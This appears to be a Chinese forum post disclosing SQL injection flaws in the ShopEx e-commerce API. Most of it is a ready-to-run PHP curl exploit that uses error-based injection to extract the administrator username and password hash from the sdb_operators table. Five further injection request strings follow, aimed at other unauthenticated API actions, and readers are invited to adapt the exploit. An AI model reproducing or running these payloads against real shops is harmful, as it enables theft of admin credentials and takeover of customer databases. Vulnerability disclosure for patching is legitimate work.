shopex最新版API注入漏洞分析附利用exp
13,396
缺陷文件：

\core\api\payment\2.0\api_b2b_2_0_payment_cfg.php

core\api\payment\1.0\api_b2b_2_0_payment_cfg.php

第44行 $data['columns'] 未做过滤导致注入

exp:
<?php
 
set_time_limit(0);
ob_flush();
echo 'Test: http://localhost:808' . "\r\n";
$sql = 'columns=* from sdb_payment_cfg WHERE 1 and (select 1 from(select count(*),concat((select 
(select (SELECT concat(username,0x7c,userpass) FROM sdb_operators limit 0,1)) from 
information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables
 group by x)a)#&disabled=1';
$url = 'http://localhost:808/api.php?act=search_payment_cfg_list&api_version=2.0';
$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $sql);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
flush();
$data = curl_exec($ch);
echo $data;
curl_close($ch); 
 
?>
外带一句 ShopEx对API操作的模块未做认证，任何用户都可访问,攻击者可通过它来对产品的分类，类型，规格，品牌等，进行添加，删除和修改，过滤不当还可造成注入.

注射1：
http://localhost//api.php POST

act=search_sub_regions&api_version=1.0&return_data=string&p_region_id=22 and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from information_schema.tables limit 0,1),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)#

注射2：
http://localhost//api.php act=add_category&api_version=3.1&datas={"name":"name' and 1=x %23"}

注射3：
http://localhost//api.php act=get_spec_single&api_version=3.1&spec_id=1 xxx

注射4：
http://localhost//api.php act=online_pay_center&api_version=1.0&order_id=1x&pay_id=1¤cy=1

注射5：
http://localhost//shopex/api.php act=search_dly_h_area&return_data=string&columns=xxxxx

自己整的一个exp，利用curl来提交数据包，所以要求你的电脑需要支持curl,大家可以利用上面的exp自己改改。
